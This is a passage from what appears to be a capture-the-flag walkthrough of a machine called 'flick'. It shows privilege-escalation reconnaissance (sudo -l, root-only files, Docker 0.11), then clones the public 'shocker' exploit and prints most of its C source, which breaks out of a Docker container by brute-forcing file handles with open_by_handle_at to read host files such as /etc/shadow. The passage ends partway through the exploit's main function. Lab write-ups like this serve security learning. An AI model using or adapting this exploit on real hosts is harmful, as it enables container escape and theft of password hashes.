<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>robin@flick:~<span class="nv">$ </span>sudo -l
</span><span class='line'>Matching Defaults entries <span class="k">for</span> robin on this host:
</span><span class='line'>    env_reset, <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin
</span><span class='line'>
</span><span class='line'>User robin may run the following commands on this host:
</span><span class='line'>    <span class="o">(</span>root<span class="o">)</span> NOPASSWD: /opt/start_apache/restart.sh
</span><span class='line'>robin@flick:~<span class="err">$</span>
</span></code></pre></td></tr></table></div></figure>


<p>This shell script seems to restart the Apache servers when run</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>robin@flick:~<span class="nv">$ </span>sudo /opt/start_apache/restart.sh
</span><span class='line'> * Restarting web server apache2                                                                                        apache2: Could not reliably determine the server<span class="s1">&#39;s fully qualified domain name, using 127.0.1.1 for ServerName</span>
</span><span class='line'><span class="s1"> ... waiting apache2: Could not reliably determine the server&#39;</span>s fully qualified domain name, using 127.0.1.1 <span class="k">for</span> ServerName
</span><span class='line'>                                                                                                                 <span class="o">[</span> OK <span class="o">]</span>
</span><span class='line'>start_apache-8000: stopped
</span><span class='line'>start_apache-8000: started
</span><span class='line'>robin@flick:~<span class="err">$</span>
</span></code></pre></td></tr></table></div></figure>


<p>The file cannot be viewed, as the permissions prevent it</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>robin@flick:~<span class="nv">$ </span>ls -l /opt/start_apache/
</span><span class='line'>total 8
</span><span class='line'>-rwx------ <span class="m">1</span> root root   <span class="m">79</span> Aug  <span class="m">4</span> 17:04 restart.sh
</span><span class='line'>-rwx------ <span class="m">1</span> root root <span class="m">2285</span> Aug  <span class="m">4</span> 17:09 start.py
</span><span class='line'>robin@flick:~<span class="err">$</span>
</span></code></pre></td></tr></table></div></figure>


<p>There&rsquo;s got to be another way to read that file to see what it&rsquo;s doing. Further poking around resulted in me finding out that Docker is installed (Docker is quite cool - take a look). However, as with any application, there are vulnerabilities.</p>

<p>The docker version command shows us the server is running version 0.11</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>robin@flick:~<span class="nv">$ </span>docker version
</span><span class='line'>Client version: 0.11.0
</span><span class='line'>Client API version: 1.11
</span><span class='line'>Go version <span class="o">(</span>client<span class="o">)</span>: go1.2.1
</span><span class='line'>Git commit <span class="o">(</span>client<span class="o">)</span>: 15209c3
</span><span class='line'>Server version: 0.11.0
</span><span class='line'>Server API version: 1.11
</span><span class='line'>Git commit <span class="o">(</span>server<span class="o">)</span>: 15209c3
</span><span class='line'>Go version <span class="o">(</span>server<span class="o">)</span>: go1.2.1
</span><span class='line'>Last stable version: 1.1.2, please update docker
</span><span class='line'>robin@flick:~<span class="err">$</span>
</span></code></pre></td></tr></table></div></figure>


<p>Which, according to <a href="http://blog.docker.com/2014/06/docker-container-breakout-proof-of-concept-exploit/">this site</a>, is vulnerable to a container breakout. The blog indicates that there is PoC code out in the wild - so off I went to find it. Turns out it&rsquo;s <a href="https://github.com/gabrtv/shocker">on github</a>, obviously.</p>

<p>OK, so lets clone the repo to the local machine and have a look at the code</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>robin@flick:~<span class="nv">$ </span>git clone https://github.com/gabrtv/shocker
</span><span class='line'>Cloning into <span class="s1">&#39;shocker&#39;</span>...
</span><span class='line'>remote: Counting objects: 27, <span class="k">done</span>.
</span><span class='line'>remote: Total <span class="m">27</span> <span class="o">(</span>delta 0<span class="o">)</span>, reused <span class="m">0</span> <span class="o">(</span>delta 0<span class="o">)</span>
</span><span class='line'>Unpacking objects: 100% <span class="o">(</span>27/27<span class="o">)</span>, <span class="k">done</span>.
</span><span class='line'>robin@flick:~<span class="err">$</span>
</span></code></pre></td></tr></table></div></figure>




<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
<span class='line-number'>80</span>
<span class='line-number'>81</span>
<span class='line-number'>82</span>
<span class='line-number'>83</span>
<span class='line-number'>84</span>
<span class='line-number'>85</span>
<span class='line-number'>86</span>
<span class='line-number'>87</span>
<span class='line-number'>88</span>
<span class='line-number'>89</span>
<span class='line-number'>90</span>
<span class='line-number'>91</span>
<span class='line-number'>92</span>
<span class='line-number'>93</span>
<span class='line-number'>94</span>
<span class='line-number'>95</span>
<span class='line-number'>96</span>
<span class='line-number'>97</span>
<span class='line-number'>98</span>
<span class='line-number'>99</span>
<span class='line-number'>100</span>
<span class='line-number'>101</span>
<span class='line-number'>102</span>
<span class='line-number'>103</span>
<span class='line-number'>104</span>
<span class='line-number'>105</span>
<span class='line-number'>106</span>
<span class='line-number'>107</span>
<span class='line-number'>108</span>
<span class='line-number'>109</span>
<span class='line-number'>110</span>
<span class='line-number'>111</span>
<span class='line-number'>112</span>
<span class='line-number'>113</span>
<span class='line-number'>114</span>
<span class='line-number'>115</span>
<span class='line-number'>116</span>
<span class='line-number'>117</span>
<span class='line-number'>118</span>
<span class='line-number'>119</span>
<span class='line-number'>120</span>
<span class='line-number'>121</span>
<span class='line-number'>122</span>
<span class='line-number'>123</span>
<span class='line-number'>124</span>
<span class='line-number'>125</span>
<span class='line-number'>126</span>
<span class='line-number'>127</span>
<span class='line-number'>128</span>
<span class='line-number'>129</span>
<span class='line-number'>130</span>
<span class='line-number'>131</span>
<span class='line-number'>132</span>
<span class='line-number'>133</span>
<span class='line-number'>134</span>
<span class='line-number'>135</span>
<span class='line-number'>136</span>
<span class='line-number'>137</span>
<span class='line-number'>138</span>
<span class='line-number'>139</span>
<span class='line-number'>140</span>
<span class='line-number'>141</span>
<span class='line-number'>142</span>
<span class='line-number'>143</span>
<span class='line-number'>144</span>
<span class='line-number'>145</span>
<span class='line-number'>146</span>
<span class='line-number'>147</span>
<span class='line-number'>148</span>
<span class='line-number'>149</span>
<span class='line-number'>150</span>
<span class='line-number'>151</span>
<span class='line-number'>152</span>
<span class='line-number'>153</span>
<span class='line-number'>154</span>
<span class='line-number'>155</span>
<span class='line-number'>156</span>
<span class='line-number'>157</span>
<span class='line-number'>158</span>
<span class='line-number'>159</span>
<span class='line-number'>160</span>
<span class='line-number'>161</span>
<span class='line-number'>162</span>
<span class='line-number'>163</span>
<span class='line-number'>164</span>
<span class='line-number'>165</span>
<span class='line-number'>166</span>
<span class='line-number'>167</span>
<span class='line-number'>168</span>
<span class='line-number'>169</span>
<span class='line-number'>170</span>
<span class='line-number'>171</span>
<span class='line-number'>172</span>
<span class='line-number'>173</span>
<span class='line-number'>174</span>
<span class='line-number'>175</span>
<span class='line-number'>176</span>
<span class='line-number'>177</span>
<span class='line-number'>178</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cm">/* shocker: docker PoC VMM-container breakout (C) 2014 Sebastian Krahmer</span>
</span><span class='line'><span class="cm"> *</span>
</span><span class='line'><span class="cm"> * Demonstrates that any given docker image someone is asking</span>
</span><span class='line'><span class="cm"> * you to run in your docker setup can access ANY file on your host,</span>
</span><span class='line'><span class="cm"> * e.g. dumping hosts /etc/shadow or other sensitive info, compromising</span>
</span><span class='line'><span class="cm"> * security of the host and any other docker VM&#39;s on it.</span>
</span><span class='line'><span class="cm"> *</span>
</span><span class='line'><span class="cm"> * docker using container based VMM: Sebarate pid and net namespace,</span>
</span><span class='line'><span class="cm"> * stripped caps and RO bind mounts into container&#39;s /. However</span>
</span><span class='line'><span class="cm"> * as its only a bind-mount the fs struct from the task is shared</span>
</span><span class='line'><span class="cm"> * with the host which allows to open files by file handles</span>
</span><span class='line'><span class="cm"> * (open_by_handle_at()). As we thankfully have dac_override and</span>
</span><span class='line'><span class="cm"> * dac_read_search we can do this. The handle is usually a 64bit</span>
</span><span class='line'><span class="cm"> * string with 32bit inodenumber inside (tested with ext4).</span>
</span><span class='line'><span class="cm"> * Inode of / is always 2, so we have a starting point to walk</span>
</span><span class='line'><span class="cm"> * the FS path and brute force the remaining 32bit until we find the</span>
</span><span class='line'><span class="cm"> * desired file (It&#39;s probably easier, depending on the fhandle export</span>
</span><span class='line'><span class="cm"> * function used for the FS in question: it could be a parent inode# or</span>
</span><span class='line'><span class="cm"> * the inode generation which can be obtained via an ioctl).</span>
</span><span class='line'><span class="cm"> * [In practise the remaining 32bit are all 0 :]</span>
</span><span class='line'><span class="cm"> *</span>
</span><span class='line'><span class="cm"> * tested with docker 0.11 busybox demo image on a 3.11 kernel:</span>
</span><span class='line'><span class="cm"> *</span>
</span><span class='line'><span class="cm"> * docker run -i busybox sh</span>
</span><span class='line'><span class="cm"> *</span>
</span><span class='line'><span class="cm"> * seems to run any program inside VMM with UID 0 (some caps stripped); if</span>
</span><span class='line'><span class="cm"> * user argument is given, the provided docker image still</span>
</span><span class='line'><span class="cm"> * could contain +s binaries, just as demo busybox image does.</span>
</span><span class='line'><span class="cm"> *</span>
</span><span class='line'><span class="cm"> * PS: You should also seccomp kexec() syscall :)</span>
</span><span class='line'><span class="cm"> * PPS: Might affect other container based compartments too</span>
</span><span class='line'><span class="cm"> *</span>
</span><span class='line'><span class="cm"> * $ cc -Wall -std=c99 -O2 shocker.c -static</span>
</span><span class='line'><span class="cm"> */</span>
</span><span class='line'>
</span><span class='line'><span class="cp">#define _GNU_SOURCE</span>
</span><span class='line'><span class="cp">#include &lt;stdio.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;sys/types.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;sys/stat.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;fcntl.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;errno.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;stdlib.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;string.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;unistd.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;dirent.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;stdint.h&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="k">struct</span> <span class="n">my_file_handle</span> <span class="p">{</span>
</span><span class='line'>  <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">handle_bytes</span><span class="p">;</span>
</span><span class='line'>  <span class="kt">int</span> <span class="n">handle_type</span><span class="p">;</span>
</span><span class='line'>  <span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">f_handle</span><span class="p">[</span><span class="mi">8</span><span class="p">];</span>
</span><span class='line'><span class="p">};</span>
</span><span class='line'>
</span><span class='line'><span class="kt">void</span> <span class="nf">die</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">msg</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>  <span class="n">perror</span><span class="p">(</span><span class="n">msg</span><span class="p">);</span>
</span><span class='line'>  <span class="n">exit</span><span class="p">(</span><span class="n">errno</span><span class="p">);</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="kt">void</span> <span class="nf">dump_handle</span><span class="p">(</span><span class="k">const</span> <span class="k">struct</span> <span class="n">my_file_handle</span> <span class="o">*</span><span class="n">h</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>  <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span><span class="s">&quot;[*] #=%d, %d, char nh[] = {&quot;</span><span class="p">,</span> <span class="n">h</span><span class="o">-&gt;</span><span class="n">handle_bytes</span><span class="p">,</span>
</span><span class='line'>          <span class="n">h</span><span class="o">-&gt;</span><span class="n">handle_type</span><span class="p">);</span>
</span><span class='line'>  <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">h</span><span class="o">-&gt;</span><span class="n">handle_bytes</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>      <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span><span class="s">&quot;0x%02x&quot;</span><span class="p">,</span> <span class="n">h</span><span class="o">-&gt;</span><span class="n">f_handle</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span>
</span><span class='line'>      <span class="k">if</span> <span class="p">((</span><span class="n">i</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> <span class="o">%</span> <span class="mi">20</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span>
</span><span class='line'>          <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span><span class="s">&quot;</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
</span><span class='line'>      <span class="k">if</span> <span class="p">(</span><span class="n">i</span> <span class="o">&lt;</span> <span class="n">h</span><span class="o">-&gt;</span><span class="n">handle_bytes</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span>
</span><span class='line'>          <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span><span class="s">&quot;, &quot;</span><span class="p">);</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'>  <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span><span class="s">&quot;};</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="kt">int</span> <span class="nf">find_handle</span><span class="p">(</span><span class="kt">int</span> <span class="n">bfd</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">path</span><span class="p">,</span> <span class="k">const</span> <span class="k">struct</span> <span class="n">my_file_handle</span> <span class="o">*</span><span class="n">ih</span><span class="p">,</span> <span class="k">struct</span> <span class="n">my_file_handle</span> <span class="o">*</span><span class="n">oh</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>  <span class="kt">int</span> <span class="n">fd</span><span class="p">;</span>
</span><span class='line'>  <span class="kt">uint32_t</span> <span class="n">ino</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'>  <span class="k">struct</span> <span class="n">my_file_handle</span> <span class="n">outh</span> <span class="o">=</span> <span class="p">{</span>
</span><span class='line'>      <span class="p">.</span><span class="n">handle_bytes</span> <span class="o">=</span> <span class="mi">8</span><span class="p">,</span>
</span><span class='line'>      <span class="p">.</span><span class="n">handle_type</span> <span class="o">=</span> <span class="mi">1</span>
</span><span class='line'>  <span class="p">};</span>
</span><span class='line'>  <span class="kt">DIR</span> <span class="o">*</span><span class="n">dir</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
</span><span class='line'>  <span class="k">struct</span> <span class="n">dirent</span> <span class="o">*</span><span class="n">de</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">path</span> <span class="o">=</span> <span class="n">strchr</span><span class="p">(</span><span class="n">path</span><span class="p">,</span> <span class="sc">&#39;/&#39;</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>  <span class="c1">// recursion stops if path has been resolved</span>
</span><span class='line'>  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">path</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>      <span class="n">memcpy</span><span class="p">(</span><span class="n">oh</span><span class="o">-&gt;</span><span class="n">f_handle</span><span class="p">,</span> <span class="n">ih</span><span class="o">-&gt;</span><span class="n">f_handle</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">oh</span><span class="o">-&gt;</span><span class="n">f_handle</span><span class="p">));</span>
</span><span class='line'>      <span class="n">oh</span><span class="o">-&gt;</span><span class="n">handle_type</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
</span><span class='line'>      <span class="n">oh</span><span class="o">-&gt;</span><span class="n">handle_bytes</span> <span class="o">=</span> <span class="mi">8</span><span class="p">;</span>
</span><span class='line'>      <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'>  <span class="o">++</span><span class="n">path</span><span class="p">;</span>
</span><span class='line'>  <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;[*] Resolving &#39;%s&#39;</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">path</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">if</span> <span class="p">((</span><span class="n">fd</span> <span class="o">=</span> <span class="n">open_by_handle_at</span><span class="p">(</span><span class="n">bfd</span><span class="p">,</span> <span class="p">(</span><span class="k">struct</span> <span class="n">file_handle</span> <span class="o">*</span><span class="p">)</span><span class="n">ih</span><span class="p">,</span> <span class="n">O_RDONLY</span><span class="p">))</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span>
</span><span class='line'>      <span class="n">die</span><span class="p">(</span><span class="s">&quot;[-] open_by_handle_at&quot;</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">if</span> <span class="p">((</span><span class="n">dir</span> <span class="o">=</span> <span class="n">fdopendir</span><span class="p">(</span><span class="n">fd</span><span class="p">))</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span>
</span><span class='line'>      <span class="n">die</span><span class="p">(</span><span class="s">&quot;[-] fdopendir&quot;</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">for</span> <span class="p">(;;)</span> <span class="p">{</span>
</span><span class='line'>      <span class="n">de</span> <span class="o">=</span> <span class="n">readdir</span><span class="p">(</span><span class="n">dir</span><span class="p">);</span>
</span><span class='line'>      <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">de</span><span class="p">)</span>
</span><span class='line'>          <span class="k">break</span><span class="p">;</span>
</span><span class='line'>      <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;[*] Found %s</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">de</span><span class="o">-&gt;</span><span class="n">d_name</span><span class="p">);</span>
</span><span class='line'>      <span class="k">if</span> <span class="p">(</span><span class="n">strncmp</span><span class="p">(</span><span class="n">de</span><span class="o">-&gt;</span><span class="n">d_name</span><span class="p">,</span> <span class="n">path</span><span class="p">,</span> <span class="n">strlen</span><span class="p">(</span><span class="n">de</span><span class="o">-&gt;</span><span class="n">d_name</span><span class="p">))</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>          <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;[+] Match: %s ino=%d</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">de</span><span class="o">-&gt;</span><span class="n">d_name</span><span class="p">,</span> <span class="p">(</span><span class="kt">int</span><span class="p">)</span><span class="n">de</span><span class="o">-&gt;</span><span class="n">d_ino</span><span class="p">);</span>
</span><span class='line'>          <span class="n">ino</span> <span class="o">=</span> <span class="n">de</span><span class="o">-&gt;</span><span class="n">d_ino</span><span class="p">;</span>
</span><span class='line'>          <span class="k">break</span><span class="p">;</span>
</span><span class='line'>      <span class="p">}</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;[*] Brute forcing remaining 32bit. This can take a while...</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">if</span> <span class="p">(</span><span class="n">de</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>      <span class="k">for</span> <span class="p">(</span><span class="kt">uint32_t</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mh">0xffffffff</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>          <span class="n">outh</span><span class="p">.</span><span class="n">handle_bytes</span> <span class="o">=</span> <span class="mi">8</span><span class="p">;</span>
</span><span class='line'>          <span class="n">outh</span><span class="p">.</span><span class="n">handle_type</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
</span><span class='line'>          <span class="n">memcpy</span><span class="p">(</span><span class="n">outh</span><span class="p">.</span><span class="n">f_handle</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">ino</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">ino</span><span class="p">));</span>
</span><span class='line'>          <span class="n">memcpy</span><span class="p">(</span><span class="n">outh</span><span class="p">.</span><span class="n">f_handle</span> <span class="o">+</span> <span class="mi">4</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">i</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">i</span><span class="p">));</span>
</span><span class='line'>
</span><span class='line'>          <span class="k">if</span> <span class="p">((</span><span class="n">i</span> <span class="o">%</span> <span class="p">(</span><span class="mi">1</span><span class="o">&lt;&lt;</span><span class="mi">20</span><span class="p">))</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span>
</span><span class='line'>              <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;[*] (%s) Trying: 0x%08x</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">de</span><span class="o">-&gt;</span><span class="n">d_name</span><span class="p">,</span> <span class="n">i</span><span class="p">);</span>
</span><span class='line'>          <span class="k">if</span> <span class="p">(</span><span class="n">open_by_handle_at</span><span class="p">(</span><span class="n">bfd</span><span class="p">,</span> <span class="p">(</span><span class="k">struct</span> <span class="n">file_handle</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">outh</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>              <span class="n">closedir</span><span class="p">(</span><span class="n">dir</span><span class="p">);</span>
</span><span class='line'>              <span class="n">close</span><span class="p">(</span><span class="n">fd</span><span class="p">);</span>
</span><span class='line'>              <span class="n">dump_handle</span><span class="p">(</span><span class="o">&amp;</span><span class="n">outh</span><span class="p">);</span>
</span><span class='line'>              <span class="k">return</span> <span class="n">find_handle</span><span class="p">(</span><span class="n">bfd</span><span class="p">,</span> <span class="n">path</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">outh</span><span class="p">,</span> <span class="n">oh</span><span class="p">);</span>
</span><span class='line'>          <span class="p">}</span>
</span><span class='line'>      <span class="p">}</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">closedir</span><span class="p">(</span><span class="n">dir</span><span class="p">);</span>
</span><span class='line'>  <span class="n">close</span><span class="p">(</span><span class="n">fd</span><span class="p">);</span>
</span><span class='line'>  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>  <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mh">0x1000</span><span class="p">];</span>
</span><span class='line'>  <span class="kt">int</span> <span class="n">fd1</span><span class="p">,</span> <span class="n">fd2</span><span class="p">;</span>
</span><span class='line'>  <span class="k">struct</span> <span class="n">my_file_handle</span> <span class="n">h</span><span class="p">;</span>
</span><span class='line'>  <span class="k">struct</span> <span class="n">my_file_handle</span> <span class="n">root_h</span> <span class="o">=</span> <span class="p">{</span>
</span><span class='line'>      <span class="p">.</span><span class="n">handle_bytes</span> <span class="o">=</span> <span class="mi">8</span><span class="p">,</span>
</span><span class='line'>      <span class="p">.</span><span class="n">handle_type</span> <span class="o">=</span> <span class="mi">1</span><span class="p">,</span>
</span><span class='line'>      <span class="p">.</span><span class="n">f_handle</span> <span class="o">=</span> <span class="p">{</span><span class="mh">0x02</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">}</span>
</span><span class='line'>  <span class="p">};</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;[***] docker VMM-container breakout Po(C) 2014             [***]</span><span class="se">\n</span><span class="s">&quot;</span>
</span><span class='line'>         <span class="s">&quot;[***] The tea from the 90&#39;s kicks your sekurity again.     [***]</span><span class="se">\n</span><span class="s">&quot;</span>
</span><span class='line'>         <span class="s">&quot;[***] If you have pending sec consulting, I&#39;ll happily     [***]</span><span class="se">\n</span><span class="s">&quot;</span>
</span><span class='line'>         <span class="s">&quot;[***] forward to my friends who drink secury-tea too!      [***]</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>  <span class="c1">// get a FS reference from something mounted in from outside</span>
</span><span class='line'>  <span class="k">if</span> <span class="p">((</span><span class="n">fd1</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="s">&quot;/.dockerinit&quot;</span><span class="p">,</span> <span class="n">O_RDONLY</span><span class="p">))</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span>
</span><span class='line'>      <span class="n">die</span><span class="p">(</span><span class="s">&quot;[-] open&quot;</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">if</span> <span class="p">(</span><span class="n">find_handle</span><span class="p">(</span><span class="n">fd1</span><span class="p">,</span> <span class="s">&quot;/etc/shadow&quot;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">root_h</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">h</span><span class="p">)</span> <span class="o">&lt;=</span> <span class="mi">0</span><span class="p">)</span>
